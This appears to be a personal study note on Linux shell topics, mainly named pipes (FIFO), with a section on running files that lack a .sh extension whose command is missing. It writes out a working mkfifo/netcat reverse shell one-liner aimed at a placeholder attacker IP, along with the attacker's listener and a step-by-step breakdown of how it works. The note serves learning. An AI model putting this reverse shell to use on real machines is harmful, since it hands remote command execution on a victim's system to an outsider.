*June09-2026*

## Running a file that has no `.sh` extension
*June09-2026*
By default a regular file doesnt have an execute permission. Read here [[User Management#^a2516e|the executre permission in files]]

But you can exectute a file by:
*Bash*


## **FIFO** 
*June 28, 2026*
*First-In, First-Out* — method commonly knows as **named pipe**.
- An extension of the traditional pipe (`|`) 
- unlike a regular file, whatever you write into it comes out the other end **instantly in real time.**

#### **Example:** A Reverse Shell 
This is done in a victims compromised machine.
```bash
mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [Attacker_IP] 4444 > /tmp/f
```

#### **Breakdown**

*Foundation: Standard Redirection with Netcat*
```
# Attacker
nc -lv 4444

# Victim
nc [attackerIP] 4444 > file
```
*Whatever the attacker types gets sent through the socket and written into `file` on the victim's machine. The file is a **dead end** — data goes in and sits there.*

In attacker's terminal, If type like
```
Hello, test, Hi
```
it doesnt display in victims terminal, but redirected in the `file`

**The Upgrade: Replacing the file with a FIFO**
```
# Attacker
nc -lv 4444

# Victim
nc [attackerIP] 4444 > /tmp/f
```

```d
cat /tmp/f          # reads from the FIFO (waiting for input)
| /bin/bash -i      # feeds that input into bash as commands
2>&1                # merges error messages into the output
| nc [attackerIP]   # sends bash output to attacker
> /tmp/f            # writes attacker's input BACK into the FIFO

```

**The Loop:**
```
Attacker types command
        ↓
nc receives it → writes to /tmp/f
        ↓
cat reads /tmp/f → feeds to bash
        ↓
bash executes → output goes to nc
        ↓
nc sends output back to attacker
        ↓
attacker sees result, types next command...
```